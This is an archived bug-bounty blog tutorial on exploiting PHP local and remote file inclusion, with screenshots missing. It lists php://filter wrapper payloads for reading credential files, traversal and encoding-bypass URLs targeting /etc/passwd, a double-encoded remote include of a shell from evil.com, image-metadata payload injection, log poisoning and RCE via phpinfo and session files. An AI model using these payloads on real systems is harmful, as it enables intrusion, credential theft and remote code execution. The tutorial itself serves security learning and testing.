# Best Approach to LFI

- **Source URL:** https://medium.com/@anekantsinghai/best-approach-to-lfi-40c91f1dfc54?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126214558/https://medium.com/@anekantsinghai/best-approach-to-lfi-40c91f1dfc54
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3518 (id 3518)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Best Approach to LFI

This blog would not have been possible without [Sachin sir](https://www.linkedin.com/in/vsachin168/) , founder of Armour Infosec

First of all we need to understand what is LFI, what is the nature of the of the vulnerability , how does it differ from file traversal and how to exploit in even the hardest scenarios.

## What is LFI:

Local file inclusion and it’s brother Remote file inclusion refers to the vulnerability where an attacker is able to include any arbitrary file.

Where local File Inclusion allows an attacker to include files *on a server* through the web browser, RFI can do the same for any file *on the internet*. The nature of this vulnerability lies in the fact that when a web application includes a file without correctly sanitizing the input, allowing and attacker to manipulate the input and *inject path traversal characters* and include *other files* from the web server.

What is the cause of RFI is in the php.ini file where developer allows an option called `allow_url_include=On` making it vulnerable to RFI , But that doesn’t stops attacker to perform LFI

## How does it differ from file-traversal or file-read:

In file read we can read only the contents of a file while in file inclusion it actually includes the file for the browser to render the contents of the file see the code below:

In the file read are able to read the file contents :

While in the file inclusion: the same file get’s executed

look even the files like /etc/passwd are rendered different in both cases but the developer can pretty print it too:

## How to exploit:

When you can just call out the file inside the server that you know is there:

you can call whichever file and confirm that if it’s LFI or not , then after confirming you can traverse the path for the local file inclusion.

*“I get your point but brother how do I execute* my *code on server ? what’s the use of this code execution in LFI if I can’t place my code on server”*

There are multiple ways to do so , and we will see them all


## Scenario 1: Php Wrappers

So before executing the code let’s first browse the sensitive files like the database-connection files in php , but when there’s LFI , we call the file they get executed but we wanna read then because of their precious content i.e credentials of database and potentially same creds may be used in accounts too , so how to read instead of executing?. Imagine a scenario:

```
  1    │  <?php
   2   │     $dbhost = "localhost";
   3   │     $dbuser = "root";
   4   │     $dbpass = "P@ssw0rd!23";
   5   │     $dbname = "armour_db";
   6   │     $connection = mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);
   7   │
   8   │ ?>
```
We need this file to be read rather than executed so how to do that? Php wrappers come in picture like `str_rot13` which performs rot13 encoding to the strings , making the syntax not detectable by the browser and it printing it and we can thus convert it back

some examples are:

```
#1. string.rot13:
php://filter/read-string.rot13/resource==connection_db.php
php://filter/read-string.rot13/resource==/var/www/html/webpt/remote-file-inclusion.php
php://filter/read-string.rot13/resource=sqli/connection.php
#2. convert.iconv.utf-8.utf-16
php://filter/convert.iconv.utf-8.utf-16/resource-connection_db.php
#3. convert.base64-encode
php://filter/convert.base64-encode/resource-connection_db.php
#4. zlib.deflate
php://filter/zlib.deflate/convert.base64-encode/resource=sqli/connection.php
```
But the zlib.deflate converts output to base64 and how to convert back to text:

`echo "base64 output" | base64 -d | tee file.txt`
## Scenario 2: Null Byte and other filter bypass tricks

Extension being added or Taking the input in a single line :

It’s really irritating adding our precious files with extensions while in RFI we can make a file without extension and let it add the extension and call from our server , LFI doesn’t allows it so what to do?

we add a null byte to the last of the payload Its role is to terminate a string. Add null byte and try and see the error changes:

But alas older version of php allow these , but still worth a try…

other techniques , courtsey of [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#filter-bypass-tricks)

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
### double encoding:
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```
## Scenario 3: File upload

Imagine a scenario where we have have this file upload , and we can see the file after being uploaded in some folder , like we can call it. How to exploit this vulnerability? . Here I’m taking an example of image file upload , since it’s very intricate and common , we can actually *inject our payload into the image* and call it from browser and make it execute. There are some tools to do that , one of such is `exiftool` , for gif we can use `gifsicle`

```
1. exiftool -comment=“your-payload” <filename.jpg/png/jpeg>
2. gifsicle < example.gif --comment “your comment” new_name.gif 
```
## Scenario 4: Log Poisoning

yep , even the name gives the movie hacker vibes “log poisoning”. Log poisoning is a technique where poison the logs that are made by giving it arbitrary information i.e payload to get logged into and call that log via LFI to execute the payload , simple right? let’s see…..

First of all we need to see which log file we can poison , we need to look up at all the log files that can be poisoned , well…I’ll write another blog for that , but also the log file must be callable to be poisoned as then the efforts would be in vain

So let’s say we can access the /var/log/apache2/access.log which is the access-log for the apache , that logs every time whenever someone visits the website , so first-of-all we look at the parameters that it’s taking from us:

It’s taking 5 things from us: our ip , the date/time , the request itself , the user-agent. So what ever is reflected here can be poisoned , we start with the request poisoning , giving the filename = payload , look closely:

It’s url-encoded and reflected rather than being executed , so look for something that won’t behave like this , there’s user-agent also , but it doesn’t gets url-encoded can we poison that?:

aaandd.. we get the execution:

There are various logs , I will cover them in some other blog….

⚠️**⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️**

Warning: Be careful while poisoning the logs , because it’s one shot play as while injecting the programming language , if the syntax goes wrong , the whole log will be wrongly poisoned and will throw error everytime you call, even if you add more payloads correct they won’t run until the log has been cleaned during oscp they can be reverted machines but in real-life target P1 bounty gone!

**⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️**

## Scenario 5: RCE from phpinfo

Imagine a scenario you can call a file that has phpinfo() via LFI but you don’t know how to proceed. Well today’s your day….we will look right into that:

The exploit from payloadallthethings will help us in that: [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py)

change the request to your link and run the script and we get a shell

But wait ….. what just happened?let me explain:

1\. The `setup()` function constructs the initial payloads and HTTP requests necessary for the attack. It prepares a payload that writes a PHP shell into a temporary file and constructs a multipart/form-data POST request.

2\. The `phpInfoLFI()` function is the main LFI exploitation logic. It connects to the target web server and sends a crafted `phpinfo()` request to determine the offset of the `[tmp_name] =>` string in the PHP output. It then sends an LFI request to include the crafted PHP shell using the determined offset.

3\. The `getOffset()` function retrieves the offset ie. the memory value in the stack where the `[tmp_name] =>` string is kept in the `phpinfo()` response.

4\. The `main()` function is the script's entry point. It retrieves user-provided arguments, sets up the attack parameters, spawns a pool of worker threads, and monitors the progress of the attack.

## Scenario 6: RCE from phpsessionid :

Yes , you read this right… from session id too

On login , a session is being created , the cookie is on client side while the session is on server side , we will be having the LFI on that

When we give some creds we create a session id

Which is then stored like this:

Since the owner i.e apache can read it we call the file:

We edit the name:

and we get the RCE

There’s also a scenario where the login credentials are fixed then only session id is made , like this:

look at line 18 we can see a cookie is being added , we can the payload in cookie then instead of username and get the RCE
